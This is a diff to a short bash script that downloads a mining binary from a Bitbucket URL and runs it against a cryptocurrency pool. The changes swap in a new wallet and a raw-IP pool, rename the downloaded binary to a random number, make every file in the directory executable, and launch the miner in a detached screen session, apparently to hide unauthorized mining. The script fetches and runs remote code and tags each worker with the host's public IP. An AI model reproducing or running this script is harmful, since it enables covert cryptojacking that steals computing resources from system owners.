@@ -1,9 +1,10 @@
 #!/bin/bash
 
-WELS=0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
-PAL=stratum+tcp://us1.ethermine.org:4444
+WELS=nano_34zxr51ybgctoqr9gkn5znqtyd5ji83ck1z4idqqdpm7xznfxfa4fpua4ik8
+PAL=147.135.11.137:2020
 WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON
-
+COMS="--algo ETHASH --pool $PAL --user $WELS.$WER"
+TIP=$(shuf -n 1 -i 1-200000)
 
 
 FILE=./tuan
@@ -11,6 +12,7 @@ if [ -f "$FILE" ]; then
     echo "$FILE exists."
 else 
     wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
-    chmod +x ./tuan
+    mv tuan $TIP
+    chmod +x *
 fi
-screen -dmLS mine ./tuan --algo ETHASH --pool $PAL --user $WELS.$WER
+screen -dmLS ./$TIP $COMS
